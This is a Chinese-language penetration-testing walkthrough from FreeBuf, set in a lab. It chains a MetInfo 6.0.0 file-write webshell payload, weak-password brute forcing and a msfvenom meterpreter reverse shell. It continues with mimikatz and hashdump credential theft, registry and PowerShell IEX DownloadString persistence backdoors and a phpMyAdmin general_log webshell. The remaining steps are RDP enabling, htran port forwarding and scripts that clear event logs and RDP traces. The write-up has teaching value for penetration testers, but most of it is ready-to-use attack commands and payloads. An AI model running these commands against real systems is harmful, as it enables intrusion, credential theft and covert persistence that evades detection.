***本文原创作者：twosmi1e，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

## 0x00 环境搭建

攻击机：kali linux及Windows10(本机)

边缘机：Windows 2003 公网IP：192.168.61.140 内网IP：192.168.129.139

靶机：Windows 2008 内网IP192.168.129.130

![Alt
text](https://image.3001.net/images/20190107/1546864570_5c3347ba7bdb4.png!small)

## 0x01 引言

### 漏洞概述

MetInfo是中国米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。Metinfo
6.0.0版本中存在安全漏洞。远程攻击者可通过向admin/column/save.php文件发送‘module’参数利用该漏洞向.php文件写入代码并执行该代码。

### 影响版本

MetInfo 5.3.16MetInfo 6.0.0

### 漏洞分析

漏洞发生在metinfo6.0.0\admin\column\save.php的column_copyconfig函数。![Alt
text](https://image.3001.net/images/20190107/1546864624_5c3347f01791e.png!small)跟进`column_copyconfig`：![Alt
text](https://image.3001.net/images/20190107/1546864642_5c3348021a3c4.png!small)跟进`Copyindx()`：![Alt
text](https://image.3001.net/images/20190107/1546864661_5c33481572fb8.png!small)

    
    
    /*复制首页*/
    function Copyindx($newindx,$type){
        if(!file_exists($newindx)){
            $oldcont ="<?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?>";
    
            $fp = fopen($newindx,w);
            fputs($fp, $oldcont);
            fclose($fp);
        }
    }
    

可以看到这里将`$type`变量直接写入了文件中，而`$type`变量一直可以追溯到column_copyconfig的`$module`变量而metinfo一个经典的伪全局变量覆盖，在`metinfo6.0.0\admin\include\common.inc.php`中。

    
    
    foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
        foreach($$_request as $_key => $_value) {
            $_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);
            $_M['form'][$_key]=daddslashes($_value,0,0,1);
        }
    }
    

这样我们可以通过传入get参数，覆盖$module变量，导致任意文件写入。

## 0x02 边缘机渗透

### 信息收集

访问网站：![Alt
text](https://image.3001.net/images/20190107/1546864723_5c334853c1f8b.png!small)进行whoami，后台扫描，目录扫描，端口扫描等常见信息收集，通过HTTP报文响应头部可初步判断网站技术架构。![Alt
text](https://image.3001.net/images/20190107/1546864726_5c33485698ce4.png!small)发现网站为metinfo5.3.19：
![Alt
text](https://image.3001.net/images/20190107/1546864748_5c33486cb58a0.png!small)

### 获取webshell

 **查找漏洞**

Metinfo6.0.0之前版本存在后台getshell漏洞，登入后台即可使用payload getshell。

 **爆破后台**

扫出后台目录为/admin弱口令爆破admin，admin登入后台。

 **getshell**

    
    
    Payload:admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST['a']);/*

 **菜刀连接**

Shell在upload目录下的index.php，使用蚁剑连接。![Alt
text](https://image.3001.net/images/20190107/1546864779_5c33488b1d275.png!small)看一下权限administrator，不用提权了。![Alt
text](https://image.3001.net/images/20190107/1546864787_5c3348933e61a.png!small)

### 使用msf进行后渗透

msf生成后门`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.61.3 -f
exe>twosmile.exe`传到目标机：![Alt
text](https://image.3001.net/images/20190107/1546864803_5c3348a39bb4f.png!small)然后用虚拟终端运行：![Alt
text](https://image.3001.net/images/20190107/1546864849_5c3348d1836e0.png!small)在kali上可以看到shell反弹回来：![Alt
text](https://image.3001.net/images/20190107/1546864860_5c3348dcc71fd.png!small)查看进程：![Alt
text](https://image.3001.net/images/20190107/1546864884_5c3348f42f3b3.png!small)使用`migrate`迁移进程：
![Alt
text](https://image.3001.net/images/20190107/1546864881_5c3348f187cc7.png!small)

### 域信息收集

使用域下常见信息收集命令进行信息收集如getuid,systeminfo,ipconfigall,net user,net view等等。![Alt
text](https://image.3001.net/images/20190107/1546864886_5c3348f626786.png!small)![Alt
text](https://image.3001.net/images/20190107/1546864899_5c33490303d5f.png!small)![Alt
text](https://image.3001.net/images/20190107/1546864904_5c334908bfda5.png!small)发现两张网卡两个IP，确定有内网无误，使用msf进行getsystem：![Alt
text](https://image.3001.net/images/20190107/1546864908_5c33490c10aa5.png!small)其他msf信息收集命令：

    
    
    run post/windows/gather/checkvm  #是否虚拟机
    
    run post/linux/gather/checkvm  #是否虚拟机
    
    run post/windows/gather/forensics/enum_drives  #查看分区
    
    run post/windows/gather/enum_applications  #获取安装软件信息
    
    run post/windows/gather/dumplinks  #获取最近的文件操作
    
    run post/windows/gather/enum_ie  #获取IE缓存
    
    run post/windows/gather/enum_chrome  #获取Chrome缓存
    
    run post/windows/gather/enum_patches  #补丁信息
    
    run post/windows/gather/enum_domain  #查找域控
    

### 获取密码

使用msf：

    
    
    load mimikatz
    kerberos
    

![Alt
text](https://image.3001.net/images/20190107/1546864928_5c334920d17e8.png!small)失败，尝试hashdump：![Alt
text](https://image.3001.net/images/20190107/1546864953_5c33493987af1.png!small)破解hash：![Alt
text](https://image.3001.net/images/20190107/1546864960_5c3349402ab80.png!small)

### 权限维持

通过Meterpretershell获取持久性shell的方法有两种，这里我使用的是第一种。

 **Persistence模块**

![Alt
text](https://image.3001.net/images/20190107/1546865022_5c33497e5879e.png!small)
运行`run persistence -U -i 10 -p 4444 -r 192.168.61.3`：![Alt
text](https://image.3001.net/images/20190107/1546865032_5c334988affbf.png!small)

>
> -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。
>
> -i：设置反向连接间隔时间，单位为秒；
>
> -p：设置反向连接的端口号；
>
> -r：设置反向连接的ip地址。

这样重启后任然会有shell反弹。

 **Metsvc模块**

![Alt
text](https://image.3001.net/images/20190107/1546865056_5c3349a0777c4.png!small)
这个模块是直接开启服务 监听31337端口利用handler下的windows/metsvc_bind_tcp模块，重新获得shell。

 **powershell权限维持**

powershell脚本：[https://github.com/re4lity/Schtasks-Backdoor](https://github.com/re4lity/Schtasks-Backdoor%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%A7%81Readme%E6%96%87%E4%BB%B6%E3%80%82)
[](https://github.com/re4lity/Schtasks-Backdoor)使用方法见Readme文件。

    
    
    powershell.exe-exec bypass -c "IEX (New-ObjectNet.WebClient).DownloadString('http://192.168.61.140/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor-method nccat -ip 192.168.61.3 -port 53 -time 2"
    

192.168.61.140 本地服务器。

192.168.61.3 nc主机。

### 开启3389

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
    

中文会乱码：![Alt
text](https://image.3001.net/images/20190107/1546865167_5c334a0fd2450.png!small)输入之前抓到的用户名密码：![Alt
text](https://image.3001.net/images/20190107/1546865174_5c334a16d0fc9.png!small)![Alt
text](https://image.3001.net/images/20190107/1546865185_5c334a2146ae8.png!small)登入远程桌面后也可以收集一波信息：![Alt
text](https://image.3001.net/images/20190107/1546865205_5c334a3552725.png!small)![Alt
text](https://image.3001.net/images/20190107/1546865214_5c334a3ec5229.png!small)域控IP：![Alt
text](https://image.3001.net/images/20190107/1546865219_5c334a43a6dd0.png!small)

其他常用命令：

> ipconfig /all 查看本机IP，所在域
>
> net user /domain 查询域用户
>
> net group /domain —— 查询域里面的工作组
>
> net group “domain admins” /domain —— 查询域管理员用户组
>
> ping D1.com 查看域控的IPnltest /dclist:d1 查看域控名字
>
> net time /domain 查看时间，域控机器名
>
> net view 显示域中的计算机名列表
>
> net view /domain:D1 显示指定域中机器名
>
> net user /domain 查看当前域中的用户
>
> net group “domain admins” /domain 查询域管理员用户组
>
> net config workstation 显示更改可配置工作站参数，也可以获得登录域，机器名等信息
>
> net accounts查看本地密码策略
>
> netstat –an/ano/anb网络连接查询
>
> route print路由表
>
> dsquery，可以用来收集跨域的信息，但是跨域执行的前提是必须建立信任关系

 **这些命令也可以直接在msf中输入`shell`命令执行。**

## 0x03 内网渗透

### 查看arp缓存

arp：

![Alt
text](https://image.3001.net/images/20190107/1546865287_5c334a87828c2.png!small)

route：

![Alt
text](https://image.3001.net/images/20190107/1546865300_5c334a9468e05.png!small)

### 添加路由

![Alt
text](https://image.3001.net/images/20190107/1546865317_5c334aa521c0f.png!small)

### 端口扫描

![Alt
text](https://image.3001.net/images/20190107/1546865348_5c334ac4db049.png!small)![Alt
text](https://image.3001.net/images/20190107/1546865355_5c334acbc75fd.png!small)

445端口看一下是否能用ms17010：![Alt
text](https://image.3001.net/images/20190107/1546865361_5c334ad1dcbc0.png!small)

不能打，用边缘机远程桌面看看80端口有什么服务。

### webshell

![Alt
text](https://image.3001.net/images/20190107/1546865402_5c334afa06d12.png!small)有apache
phpmyadmin记下绝对路径`C:/phpStudy/PHPTutorial/WWW`。

尝试弱口令登入phpmyadmin然后日志写shell：

    
    
    show variables like '%general%';
    set global general_log = on;
    set global general_log_file = 'C:/phpStudy/PHPTutorial/WWW/shell.php';
    select '<?php eval($_POST['a']);?>'
    

![Alt
text](https://image.3001.net/images/20190107/1546865412_5c334b049ddb5.png!small)报错无所谓
已经存进日志了，然后传个菜刀到边缘机，用边缘机连一下：![Alt
text](https://image.3001.net/images/20190107/1546865419_5c334b0b5aaae.png!small)![Alt
text](https://image.3001.net/images/20190107/1546865427_5c334b133f550.png!small)

### 开3389

![Alt
text](https://image.3001.net/images/20190107/1546865434_5c334b1a74b51.png!small)传个脚本上去抓hash：![Alt
text](https://image.3001.net/images/20190107/1546865439_5c334b1fe5a0f.png!small)mimikatz也可以：![Alt
text](https://image.3001.net/images/20190107/1546865462_5c334b36175c1.png!small)

    
    
    privilege::debug
    
    sekurlsa::logonPasswords
    

![Alt
text](https://image.3001.net/images/20190107/1546865480_5c334b4888b02.png!small)

### 端口转发

上传htran：![Alt
text](https://image.3001.net/images/20190107/1546865489_5c334b51a97a7.png!small)`htran
-p -tran 8888 192.168.129.130
3389`将域控3389转发到边缘机8888再连边缘机ip(192.168.61.140:8888)远程桌面：![Alt
text](https://image.3001.net/images/20190107/1546865501_5c334b5d8993f.png!small)连接成功。

### 痕迹清除

简单清除一下，动静还是比较大的；

msf中clearev：![Alt
text](https://image.3001.net/images/20190107/1546865507_5c334b630541f.png!small)3389痕迹清除脚本：

    
    
    echo off
    color 0A
    title 3389连接痕迹清除
    mode con cols=88 lines=20
    set /p fk= 确定要清空3389连接痕迹吗？(y/n)
    if /i "%fk%"=="y" goto y
    if /i "%fk%"=="n" goto n
    call %0
    
    :y
    reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client" /f
    del /a /f /q %HOMEPATH%\Documents\Default.rdp
    echo 命令执行成功，请手动查看是否清除。
    pause >nul
    
    :n
    exit
    

然后再删掉你上传的所有文件，收工。

## 0x04 参考文章

[1] Metinfo 6.0.0 众多漏洞分析 <https://www.anquanke.com/post/id/154149>

[2] phpmyadmin getshell姿势<http://www.twosmi1e.com/2018/10/11/phpmyadmin-getshell%E5%A7%BF%E5%8A%BF/>

[3] 后渗透阶段的权限维持（Windows篇）<https://www.freebuf.com/articles/web/180581.html>

 ***本文原创作者：twosmi1e，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

